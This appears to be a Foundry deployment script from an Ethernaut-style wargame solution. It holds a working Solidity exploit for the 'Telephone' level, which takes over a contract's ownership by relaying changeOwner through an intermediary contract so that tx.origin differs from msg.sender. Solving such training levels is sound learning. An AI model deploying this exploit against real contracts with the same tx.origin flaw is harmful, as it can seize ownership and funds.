// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script, console} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

interface ITelephone {
    function changeOwner(address _owner) external;
    function owner() external returns(uint256);
}

contract TelephoneAttack {
    function attack(ITelephone victim, address newOwner) public {
        console.log("TX Origin: ", tx.origin);
        console.log("Msg sender: ", msg.sender);
        
        victim.changeOwner(newOwner);
    }
}

contract TelephoneAttacker is Constants, Script {

    TelephoneAttack telephoneAttack;

    function run() public {
        console.log("Deploying TelephoneAttack contract...");
        
        vm.startBroadcast(ATTACKER_ADDRESS);
        TelephoneAttack attackContract = new TelephoneAttack();
        vm.stopBroadcast();
        
        console.log("DEPLOYED_ADDRESS:", address(attackContract));
        console.log("Save this address for the next step!");
    }
}